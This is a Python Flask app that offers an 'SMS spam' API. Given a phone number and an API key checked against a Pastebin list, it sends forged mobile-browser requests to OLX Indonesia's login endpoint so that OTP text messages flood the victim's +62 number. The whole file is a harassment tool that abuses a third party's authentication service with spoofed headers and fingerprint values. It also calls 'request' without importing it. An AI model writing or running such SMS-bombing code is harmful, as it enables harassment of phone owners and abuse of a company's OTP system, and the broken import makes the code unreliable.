from flask import Flask, jsonify
import os
import json
import requests

app = Flask(__name__)


@app.route('/')
def index():
    return jsonify({"Choo Choo": "Welcome to your Flask app 🚅"})

@app.route('/api/spam/sms/olx', methods=['GET','POST'])
def olx():
	if request.args.get('apikey'):
		if request.args.get('nomor'):
			no = request.args.get('nomor')
			apikey=request.args.get("apikey")
			apikey1 = requests.get('https://pastebin.com/raw/c2MU81Jb').text
			if apikey in apikey1:
				dat = json.dumps({"grantType":"phone","phone":"+62"+no,"language":"id"})
				ua = "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
				head={"Host":"www.olx.co.id","x-newrelic-id":"VQMGU1ZVDxABU1lbBgMDUlI=","origin":"https://www.olx.co.id","x-panamera-fingerprint":"e01600dd8c6a82fa2dff1ec15164a252#1638175525174","user-agent":ua,"content-type":"application/json","accept":"*/*","referer":"https://www.olx.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
				api = requests.post("https://www.olx.co.id/api/auth/authenticate", data=dat, headers=head).text
				if 'PENDING' in api:
					return {
						'status': True,
						'apikey': 'aktif',
						'message': 'spam sms berhasil | Xenzi ganz'
					}
				else:
					return {
						'status': False,
						'apikey': 'aktif',
						'message': 'spam sms gagal | Xenzi ganz'
					}
			else:
				return {
					"status": False,
					"message": "apikey invalid"
				}
		else:
			return {
				'status': False,
				'message': 'masukan parameter nomor !!'
			}
	else:
		return {
			"status": False,
			"message": "masukan apikey anda !!"
		}

if __name__ == '__main__':
    app.run(debug=True, port=os.getenv("PORT", default=5000))
